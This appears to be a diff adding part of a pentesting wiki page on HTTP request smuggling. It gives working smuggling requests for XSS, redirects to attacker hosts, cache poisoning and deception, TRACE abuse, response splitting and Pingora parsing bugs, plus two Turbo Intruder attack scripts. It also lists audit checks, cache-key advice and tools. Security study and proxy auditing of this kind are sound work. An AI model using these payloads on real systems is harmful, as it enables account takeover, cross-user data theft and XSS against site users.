+GET /post?postId=2 HTTP/1.1
+Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
+User-Agent: "><script>alert(1)</script>
+Content-Length: 10
+Content-Type: application/x-www-form-urlencoded
+
+A=
+```
+
+This payload is structured to exploit the vulnerability by:
+
+1. Initiating a `POST` request, seemingly typical, with a `Transfer-Encoding: chunked` header to indicate the start of smuggling.
+2. Following with a `0`, marking the end of the chunked message body.
+3. Then, a smuggled `GET` request is introduced, where the `User-Agent` header is injected with a script, `<script>alert(1)</script>`, triggering the XSS when the server processes this subsequent request.
+
+By manipulating the `User-Agent` through smuggling, the payload bypasses normal request constraints, thus exploiting the Reflected XSS vulnerability in a non-standard but effective manner.
+
+#### HTTP/0.9
+
+> [!CAUTION]
+> In case the user content is reflected in a response with a **`Content-type`** such as **`text/plain`**, preventing the execution of the XSS. If the server support **HTTP/0.9 it might be possible to bypass this**!
+
+The version HTTP/0.9 was previously to the 1.0 and only uses **GET** verbs and **doesn’t** respond with **headers**, just the body.
+
+In [**this writeup**](https://mizu.re/post/twisty-python), this was abused with a request smuggling and a **vulnerable endpoint that will reply with the input of the user** to smuggle a request with HTTP/0.9. The parameter that will be reflected in the response contained a **fake HTTP/1.1 response (with headers and body)** so the response will contain valid executable JS code with a `Content-Type` of `text/html`.<sup>[[10]](#references)</sup>
+
+### Exploiting On-site Redirects with HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>
+
+Applications often redirect from one URL to another by using the hostname from the `Host` header in the redirect URL. This is common with web servers like Apache and IIS. For instance, requesting a folder without a trailing slash results in a redirect to include the slash:<sup>[[3]](#references)</sup>
+
+```
+GET /home HTTP/1.1
+Host: normal-website.com
+```
+
+Results in:
+
+```
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+
+Though seemingly harmless, this behavior can be manipulated using HTTP request smuggling to redirect users to an external site. For example:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+```
+
+This smuggled request could cause the next processed user request to be redirected to an attacker-controlled website:
+
+```
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+
+Results in:
+
+```
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+In this scenario, a user's request for a JavaScript file is hijacked. The attacker can potentially compromise the user by serving malicious JavaScript in response.
+
+### Exploiting Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>
+
+Web cache poisoning can be executed if any component of the **front-end infrastructure caches content**, typically to enhance performance. By manipulating the server's response, it's possible to **poison the cache**.<sup>[[3]](#references)</sup>
+
+Previously, we observed how server responses could be altered to return a 404 error (refer to [Basic Examples](#basic-examples)). Similarly, it’s feasible to trick the server into delivering `/index.html` content in response to a request for `/static/include.js`. Consequently, the `/static/include.js` content gets replaced in the cache with that of `/index.html`, rendering `/static/include.js` inaccessible to users, potentially leading to a Denial of Service (DoS).
+
+This technique becomes particularly potent if an **Open Redirect vulnerability** is discovered or if there's an **on-site redirect to an open redirect**. Such vulnerabilities can be exploited to replace the cached content of `/static/include.js` with a script under the attacker's control, essentially enabling a widespread Cross-Site Scripting (XSS) attack against all clients requesting the updated `/static/include.js`.
+
+Below is an illustration of exploiting **cache poisoning combined with an on-site redirect to open redirect**. The objective is to alter the cache content of `/static/include.js` to serve JavaScript code controlled by the attacker:
+
+```
+POST / HTTP/1.1
+Host: vulnerable.net
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: attacker.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+```
+
+Note the embedded request targeting `/post/next?postId=3`. This request will be redirected to `/post?postId=4`, utilizing the **Host header value** to determine the domain. By altering the **Host header**, the attacker can redirect the request to their domain (**on-site redirect to open redirect**).
+
+After successful **socket poisoning**, a **GET request** for `/static/include.js` should be initiated. This request will be contaminated by the prior **on-site redirect to open redirect** request and fetch the content of the script controlled by the attacker.
+
+Subsequently, any request for `/static/include.js` will serve the cached content of the attacker's script, effectively launching a broad XSS attack.
+
+### Using HTTP request smuggling to perform web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>
+
+> **What is the difference between web cache poisoning and web cache deception?**
+>
+> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.<sup>[[3]](#references)</sup>
+
+The attacker crafts a smuggled request that fetches sensitive user-specific content. Consider the following example:
+
+```markdown
+`POST / HTTP/1.1`\
+`Host: vulnerable-website.com`\
+`Connection: keep-alive`\
+`Content-Length: 43`\
+`Transfer-Encoding: chunked`\
+`` \ `0`\ ``\
+`GET /private/messages HTTP/1.1`\
+`Foo: X`
+```
+
+If this smuggled request poisons a cache entry intended for static content (e.g., `/someimage.png`), the victim's sensitive data from `/private/messages` might be cached under the static content's cache entry. Consequently, the attacker could potentially retrieve these cached sensitive data.
+
+### Abusing TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>
+
+[**In this post**](https://portswigger.net/research/trace-desync-attack) is suggested that if the server has the method TRACE enabled it could be possible to abuse it with a HTTP Request Smuggling. This is because this method will reflect any header sent to the server as part of the body of the response. For example:<sup>[[8]](#references)</sup>
+
+```
+TRACE / HTTP/1.1
+Host: example.com
+XSS: <script>alert("TRACE")</script>
+```
+
+Will send a response such as:
+
+```
+HTTP/1.1 200 OK
+Content-Type: message/http
+Content-Length: 115
+
+TRACE / HTTP/1.1
+Host: vulnerable.com
+XSS: <script>alert("TRACE")</script>
+X-Forwarded-For: xxx.xxx.xxx.xxx
+```
+
+An example on how to abuse this behaviour would be to **smuggle first a HEAD request**. This request will be responded with only the **headers** of a GET request (**`Content-Type`** among them). And smuggle **immediately after the HEAD a TRACE request**, which will be **reflecting the sent dat**a.\
+As the HEAD response will be containing a `Content-Length` header, the **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** in the response.\
+This response will be sent to the next request over the connection, so this could be **used in a cached JS file for example to inject arbitrary JS code**.
+
+### Abusing TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>
+
+Continue following [**this post**](https://portswigger.net/research/trace-desync-attack) is suggested another way to abuse the TRACE method. As commented, smuggling a HEAD request and a TRACE request it's possible to **control some reflected data** in the response to the HEAD request. The length of the body of the HEAD request is basically indicated in the Content-Length header and is formed by the response to the TRACE request.<sup>[[8]](#references)</sup>
+
+Therefore, the new idea would be that, knowing this Content-Length and the data given in the TRACE response, it's possible to make the TRACE response contains a valid HTTP response after the last byte of the Content-Length, allowing an attacker to completely control the request to the next response (which could be used to perform a cache poisoning).
+
+Example:
+
+```
+GET / HTTP/1.1
+Host: example.com
+Content-Length: 360
+
+HEAD /smuggled HTTP/1.1
+Host: example.com
+
+POST /reflect HTTP/1.1
+Host: example.com
+
+SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
+Content-Type: text/html\r\n
+Cache-Control: max-age=1000000\r\n
+Content-Length: 44\r\n
+\r\n
+<script>alert("response splitting")</script>
+```
+
+Will generate these responses (note how the HEAD response has a Content-Length making the TRACE response part of the HEAD body and once the HEAD Content-Length ends a valid HTTP response is smuggled):
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 165
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 243
+
+SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
+Content-Type: text/html
+Cache-Control: max-age=1000000
+Content-Length: 50
+
+<script>alert(“arbitrary response”)</script>
+```
+
+### Weaponizing HTTP Request Smuggling with HTTP Response Desynchronisation
+
+Have you found some HTTP Request Smuggling vulnerability and you don't know how to exploit it. Try these other method of exploitation:
+
+
+{{#ref}}
+../http-response-smuggling-desync.md
+{{#endref}}
+
+#### Dangling-byte Response Queue Poisoning
+
+Classic response-queue poisoning often fails because the back-end emits **two responses immediately**, the front-end over-reads into the second one, and resets the connection (the **stacked-response** problem). A strong workaround is to smuggle an **incomplete inner request** whose declared body is missing **exactly one byte**. When the victim later sends `GET /victim...`, the first byte (`G`) completes the smuggled body's missing byte and the remaining bytes (`ET /victim...`) are parsed separately, shifting the response queue without the original race. The next attacker request can then receive the victim response. This works best on method-agnostic back-ends and is one of the most reliable modern RQP upgrades.<sup>[[22]](#references)</sup>
+
+```http
+POST / HTTP/1.1
+Host: target
+Content-Type: multipart/byteranges;
+Content-Length: 123
+
+POST /smuggled HTTP/1.1
+Host: target
+Content-Length: 1
+```
+
+For full response-side variants, content-confusion chains, and cache-poisoning escalations, review the dedicated response desync page above.<sup>[[22]](#references)</sup>
+
+### Anomaly-driven discovery
+
+Do not discard "weird but unclassified" results. Log mixed text/binary output, duplicated HTML documents, NUL-filled leaks, inline HTTP status lines/headers, and multiple responses to clean single requests. These anomalies can reveal memory disclosure, response forking, or fresh cross-request contamination primitives even when the original probe was not designed as a desync test.<sup>[[22]](#references)</sup>
+
+### Other HTTP Request Smuggling Techniques
+
+- Browser HTTP Request Smuggling (Client Side)
+
+
+{{#ref}}
+browser-http-request-smuggling.md
+{{#endref}}
+
+- Request Smuggling in HTTP/2 Downgrades<sup>[[7]](#references)</sup>
+
+
+{{#ref}}
+request-smuggling-in-http-2-downgrades.md
+{{#endref}}
+
+## Turbo intruder scripts
+
+### CL.TE
+
+From [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)<sup>[[20]](#references)</sup>
+
+```python
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           resumeSSL=False,
+                           timeout=10,
+                           pipeline=False,
+                           maxRetriesPerRequest=0,
+                           engine=Engine.THREADED,
+                           )
+    engine.start()
+
+    attack = '''POST / HTTP/1.1
+ Transfer-Encoding: chunked
+Host: xxx.com
+Content-Length: 35
+Foo: bar
+
+0
+
+GET /admin7 HTTP/1.1
+X-Foo: k'''
+
+    engine.queue(attack)
+
+    victim = '''GET / HTTP/1.1
+Host: xxx.com
+
+'''
+    for i in range(14):
+        engine.queue(victim)
+        time.sleep(0.05)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+### TE.CL
+
+From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)<sup>[[21]](#references)</sup>
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           resumeSSL=False,
+                           timeout=10,
+                           pipeline=False,
+                           maxRetriesPerRequest=0,
+                           engine=Engine.THREADED,
+                           )
+    engine.start()
+
+    attack = '''POST / HTTP/1.1
+Host: xxx.com
+Content-Length: 4
+Transfer-Encoding : chunked
+
+46
+POST /nothing HTTP/1.1
+Host: xxx.com
+Content-Length: 15
+
+kk
+0
+
+'''
+    engine.queue(attack)
+
+    victim = '''GET / HTTP/1.1
+Host: xxx.com
+
+'''
+    for i in range(14):
+        engine.queue(victim)
+        time.sleep(0.05)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+## Reverse-proxy parsing footguns (Pingora 2026)
+
+Several 2026 Pingora bugs are useful because they show **desync primitives beyond classic CL.TE / TE.CL**. The reusable lesson is: whenever a proxy **stops parsing too early**, **normalizes `Transfer-Encoding` differently from the backend**, or **falls back to read-until-close for request bodies**, you may get FE↔BE desync even without a traditional CL/TE ambiguity.<sup>[[16]](#references)</sup><sup>[[17]](#references)</sup><sup>[[18]](#references)</sup><sup>[[19]](#references)</sup>
+
+### Premature `Upgrade` passthrough
+
+If a reverse proxy **switches to raw tunnel / passthrough mode as soon as it sees an `Upgrade` header**, without waiting for the backend to confirm the switch with **`101 Switching Protocols`**, you can smuggle a second request in the same TCP stream:
+
+```http
+GET / HTTP/1.1
+Host: target.com
+Upgrade: anything
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: target.com
+```
+
+The front-end parses only the first request, then forwards the rest as raw bytes. The backend parses the appended bytes as a new request from the proxy's trusted IP. This is especially useful to:
+
+- Bypass proxy ACLs, WAF rules, auth checks, and rate limits.
+- Reach internal-only endpoints that trust the reverse proxy IP.
+- Trigger cross-user response queue poisoning on reused backend connections.
+
+When auditing proxies, always test whether **any** `Upgrade` value triggers passthrough, and verify whether the switch happens **before** or **after** the backend replies with `101`.
+
+### `Transfer-Encoding` normalization bugs + HTTP/1.0 close-delimited fallback
+
+Another useful pattern is:
+
+1. The proxy sees that `Transfer-Encoding` is present, so it strips `Content-Length`.
+2. The proxy **fails to normalize TE correctly**.
+3. The proxy now has **no recognized framing** and falls back to **close-delimited request bodies** for HTTP/1.0.
+4. The backend correctly understands TE and treats bytes after `0\r\n\r\n` as a new request.
+
+Common ways to trigger this:
+
+- **Comma-separated TE list not parsed**:
+
+```http
+GET / HTTP/1.0
+Host: target.com
+Connection: keep-alive
+Transfer-Encoding: identity, chunked
+Content-Length: 29
+
+0
+
+GET /admin HTTP/1.1
+X:
+```
+
+- **Duplicate TE headers not merged**:
+
+```http
+POST /legit HTTP/1.0
+Host: target.com
+Connection: keep-alive
+Transfer-Encoding: identity
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+X:
+```
+
+The important audit checks are:
+
+- Does the front-end parse the **last** TE token, as required when `chunked` is last?
+- Does it use **all** `Transfer-Encoding` headers instead of just the first one?
+- Can you force **HTTP/1.0** to trigger a read-until-close body mode?
+- Does the proxy ever allow **close-delimited request bodies**? That is a high-value desync smell by itself.
+
+This class often looks like CL.TE from the outside, but the real primitive is: **TE present --> CL stripped --> no valid framing recognized --> request body forwarded until close**.
+
+### Related cache poisoning primitive: path-only cache keys
+
+The same Pingora audit also exposed a dangerous reverse-proxy cache anti-pattern: deriving the cache key **only from the URI path**, while ignoring **Host**, scheme, or port. In multi-tenant or multi-vhost deployments, different hosts can then collide on the same cache entry:
+
+```http
+GET /api/data HTTP/1.1
+Host: evil.com
+```
+
+```http
+GET /api/data HTTP/1.1
+Host: victim.com
+```
+
+If both requests map to the same cache key (`/api/data`), one tenant can poison content for another. If the origin reflects the `Host` header in redirects, CORS, HTML, or script URLs, a low-value Host reflection can become **cross-user stored cache poisoning**.
+
+When reviewing caches, confirm that the key includes at least:
+
+- `Host` / virtual host identity
+- scheme (`http` vs `https`) when behavior differs
+- port when multiple applications share the same cache namespace
+
+## Tools
+
+- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) provides Burp-based request-smuggling probes and automation helpers.<sup>[[5]](#references)</sup>
+- HTTP Hacker (Burp BApp Store) – visualize concatenation/framing and low‑level HTTP behavior
+- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
+- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
+- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
+- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
+- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
+- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
+- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): This tool is a grammar-based HTTP Fuzzer useful to find weird request smuggling discrepancies.
+
+## References
+
+- [1] [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
+- [2] [PortSwigger - Finding HTTP Request Smuggling Vulnerabilities](https://portswigger.net/web-security/request-smuggling/finding)
+- [3] [PortSwigger - Exploiting HTTP Request Smuggling Vulnerabilities](https://portswigger.net/web-security/request-smuggling/exploiting)
+- [4] [HTTP Request Smuggling in Plain English](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
+- [5] [PortSwigger - HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
+- [6] [PortSwigger Academy - Basic CL.TE request smuggling](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
+- [7] [PortSwigger Academy - HTTP/2 downgrading](https://portswigger.net/web-security/request-smuggling/advanced/http2-downgrading)
+- [8] [PortSwigger Research - TRACE Desync Attack](https://portswigger.net/research/trace-desync-attack)
+- [9] [Bugcrowd - Unveiling TE.0 HTTP Request Smuggling: Discovering a Critical Vulnerability in Thousands of Google Cloud Websites](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
+- [10] [Twisty Python (mizu.re)](https://mizu.re/post/twisty-python)
+- [11] [PortSwigger Research - Beware the false false‑positive: how to distinguish HTTP pipelining from request smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
+- [12] [HTTP/1 Must Die](https://http1mustdie.com/)
+- [13] [PortSwigger Research - Browser‑Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
+- [14] [PortSwigger Academy - Client‑Side Desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
+- [15] [PortSwigger Research - HTTP/1 Must Die: The Desync Endgame](https://portswigger.net/research/http1-must-die)
+- [16] [xclow3n - Breaking Pingora: HTTP Request Smuggling & Cache Poisoning (archived)](https://web.archive.org/web/20260000000000id_/https://xclow3n.github.io/post/6/)
+- [17] [Cloudflare Pingora Security Advisory GHSA-xq2h-p299-vjwv](https://github.com/cloudflare/pingora/security/advisories/GHSA-xq2h-p299-vjwv)
+- [18] [Cloudflare Pingora Security Advisory GHSA-hj7x-879w-vrp7](https://github.com/cloudflare/pingora/security/advisories/GHSA-hj7x-879w-vrp7)
+- [19] [Cloudflare Pingora Security Advisory GHSA-f93w-pcj3-rggc](https://github.com/cloudflare/pingora/security/advisories/GHSA-f93w-pcj3-rggc)
+- [20] [hipotermia.pw - HTTP Desync IDOR (Turbo Intruder CL.TE script)](https://hipotermia.pw/bb/http-desync-idor)
+- [21] [hipotermia.pw - HTTP Desync Account Takeover (Turbo Intruder TE.CL script)](https://hipotermia.pw/bb/http-desync-account-takeover)
+- [22] [PortSwigger Research - Can AI do novel security research? Meet the HTTP Terminator](https://portswigger.net/research/http-terminator)
+- [23] [PortSwigger Research - CRLF-Powered Desync Attacks: Beheading HTTP Streams](https://portswigger.net/research/crlf-powered-desync-attacks)
+
+
+{{#include ../../banners/hacktricks-training.md}}
